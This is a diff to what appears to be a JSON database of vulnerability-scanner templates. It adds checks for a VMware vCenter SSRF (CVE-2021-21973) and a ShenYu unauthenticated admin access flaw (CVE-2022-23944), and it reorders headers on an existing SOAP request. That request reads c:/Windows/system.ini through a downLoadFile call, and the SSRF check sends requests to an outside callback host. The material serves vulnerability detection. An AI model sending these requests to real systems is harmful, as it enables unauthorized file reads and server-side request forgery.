@@ -10244,9 +10244,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
@@ -11949,6 +11949,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/ui/vropspluginui/rest/services/getstatus"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-21973",
+      "info": {
+        "name": "VMware vCenter Unauthenticated SSRF",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /ui/vropspluginui/rest/services/getvcdetails HTTP/1.1\nHost: {{Hostname}}\nVcip: {{interactsh-url}}\nVcpassword: {{rand_base(6)}}\nVcusername: {{rand_base(6)}}\nReqresource: {{rand_base(6)}}\n"
           ]
         }
       ]
@@ -14948,6 +14962,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/aj.html?a=devi"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-23944",
+      "info": {
+        "name": "ShenYu Admin Unauth Access",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plugin"
           ]
         }
       ]
